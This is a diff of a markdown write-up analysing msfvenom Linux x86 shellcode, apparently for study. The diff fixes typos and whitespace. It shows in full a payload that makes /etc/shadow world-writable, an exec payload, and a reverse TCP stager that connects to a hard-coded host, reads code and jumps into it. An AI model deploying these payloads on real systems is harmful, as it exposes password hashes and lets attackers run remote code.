@@ -126,7 +126,7 @@ unsigned char buf[] =
 ```
 ## Analysis
 
-Let's disassamble the code using ndisasm:
+Let's disassemble the code using ndisasm:
 ```
 $ echo -ne "\xd9\xf6\xb8\x40\xf8\x6f\x5b\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x0a\x31\x46\x17\x03\x46\x17\x83\x86\xfc\x8d\xae\x9f\x97\x5e\x09\xcd\x8f\x6d\xa9\xf1\x4f\x41\xcc\x85\x2c\xb2\x7d\x0d\xd2\xa8\xee\xba\x14\x6a\x99\xf2\x14\x8c\x59\xa3\xdb\x0c\x33\x52\xbc\xc1\x44" |ndisasm -u
 00000000  99                cdq
@@ -152,26 +152,26 @@ $ echo -ne "\xd9\xf6\xb8\x40\xf8\x6f\x5b\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x0a\x31
 
 By looking this code, between 0000000A and 00000014 we can read the string */etc/shadow*. The assembly code is:
 ```ASM
-	cdq
-	push 0xf ;chmod
-	pop eax
-	push edx
-	call call_chmod
-	db 0x2F,0x65,0x74,0x63,0x2F,0x730x68,0x61,0x64,0x6F,0x77,0x00
+ cdq
+ push 0xf ;chmod
+ pop eax
+ push edx
+ call call_chmod
+ db 0x2F,0x65,0x74,0x63,0x2F,0x730x68,0x61,0x64,0x6F,0x77,0x00
 
 call_chmod:
-	pop ebx
-	push dword 0x1b6 ; 666 = (6 × 8²) + (6 × 8¹) + (6 × 8⁰) = 438 -> 0x1B6
-	pop ecx
-	int 0x80
-	push 0x1 ; exit
-	pop eax
-	int 0x80
+ pop ebx
+ push dword 0x1b6 ; 666 = (6 × 8²) + (6 × 8¹) + (6 × 8⁰) = 438 -> 0x1B6
+ pop ecx
+ int 0x80
+ push 0x1 ; exit
+ pop eax
+ int 0x80
 ```
 
 This shellcode is pretty simple, 
  * EAX is set to 0xf (syscall for chmod)
- * EBX is set to the address at the top of the stack just after the call. So it contains the adress of "/etc/shadow\00"
+ * EBX is set to the address at the top of the stack just after the call. So it contains the address of "/etc/shadow\00"
  * ECX is set to 0x1b6 (which is the hexadecimal value of 666 in octal, 666 = (6 × 8²) + (6 × 8¹) + (6 × 8⁰) = 438
  * EDX is set to 0 (using cdq command)
 
@@ -179,9 +179,9 @@ Then chmod is called: int chmod(const char *pathname, mode_t mode);
 
 At the end, the exit syscall is called.
 ```
-	push 0x1 ; exit
-	pop eax
-	int 0x80
+ push 0x1 ; exit
+ pop eax
+ int 0x80
 ```
 
 # linux/x86/exec without Null bytes
@@ -248,7 +248,7 @@ Payload size: 43 bytes
 
 ```
 
-It is important to notice that generate the same paylaod another time will return another code:
+It is important to notice that generate the same payload another time will return another code:
 
 ```
 # msfvenom -p linux/x86/exec CMD=/bin/ls -b \x00 R |ndisasm -u -
@@ -294,7 +294,7 @@ Payload size: 70 bytes
 Using *libemu* return C like code very easy to understand.
 
 ```
-# msfvenom -p linux/x86/exec CMD=/bin/ls -b \x00 R |sctest -vvv -Ss 100000
+# msfvenom -p linux/x86/exec CMD=/bin/ls -b \x00 R |sctest -vvv -Ss 100000
 [...]
 int execve (
      const char * dateiname = 0x00416fc4 => 
@@ -384,7 +384,7 @@ No encoder or badchars specified, outputting raw payload
 Payload size: 68 bytes
 ```
 
-We can notice that the stageless payload have the same size for both cases.
+We can notice that the stageless payload has the same size for both cases.
 
 ## Payload
 
@@ -461,72 +461,72 @@ Payload size: 123 bytes
 This code can be easily turned into a NASM code.
 
 ```ASM
-global _start			
+global _start   
 
 section .text
 _start:
-	push byte +0xa
-	pop esi
+ push byte +0xa
+ pop esi
 begin:
-	xor ebx,ebx
-	mul ebx
-	push ebx
-	inc ebx
-	push ebx
-	push byte +0x2
-	mov al,0x66
-	mov ecx,esp
-	int 0x80
-	xchg eax,edi
-	pop ebx
-	push dword 0x4a01a8c0
-	push dword 0x5c110002
-	mov ecx,esp
-	push byte +0x66
-	pop eax
-	push eax
-	push ecx
-	push edi
-	mov ecx,esp
-	inc ebx
-	int 0x80
-	test eax,eax
-	jns middle
-	dec esi
-	jz end
-	push dword 0xa2
-	pop eax
-	push byte +0x0
-	push byte +0x5
-	mov ebx,esp
-	xor ecx,ecx
-	int 0x80
-	test eax,eax
-	jns begin
-	jmp end
+ xor ebx,ebx
+ mul ebx
+ push ebx
+ inc ebx
+ push ebx
+ push byte +0x2
+ mov al,0x66
+ mov ecx,esp
+ int 0x80
+ xchg eax,edi
+ pop ebx
+ push dword 0x4a01a8c0
+ push dword 0x5c110002
+ mov ecx,esp
+ push byte +0x66
+ pop eax
+ push eax
+ push ecx
+ push edi
+ mov ecx,esp
+ inc ebx
+ int 0x80
+ test eax,eax
+ jns middle
+ dec esi
+ jz end
+ push dword 0xa2
+ pop eax
+ push byte +0x0
+ push byte +0x5
+ mov ebx,esp
+ xor ecx,ecx
+ int 0x80
+ test eax,eax
+ jns begin
+ jmp end
 middle:
-	mov dl,0x7
-	mov ecx,0x1000
-	mov ebx,esp
-	shr ebx,byte 0xc
-	shl ebx,byte 0xc
-	mov al,0x7d
-	int 0x80
-	test eax,eax
-	js end
-	pop ebx
-	mov ecx,esp
-	cdq
-	mov dl,0x24
-	mov al,0x3
-	int 0x80
-	test eax,eax
-	js end
-	jmp ecx
+ mov dl,0x7
+ mov ecx,0x1000
+ mov ebx,esp
+ shr ebx,byte 0xc
+ shl ebx,byte 0xc
+ mov al,0x7d
+ int 0x80
+ test eax,eax
+ js end
+ pop ebx
+ mov ecx,esp
+ cdq
+ mov dl,0x24
+ mov al,0x3
+ int 0x80
+ test eax,eax
+ js end
+ jmp ecx
 end:
-	mov eax,0x1
-	mov ebx,0x1
-	int 0x80
+ mov eax,0x1
+ mov ebx,0x1
+ int 0x80
 ```
 
 Let's check if the compiled shellcode is working:
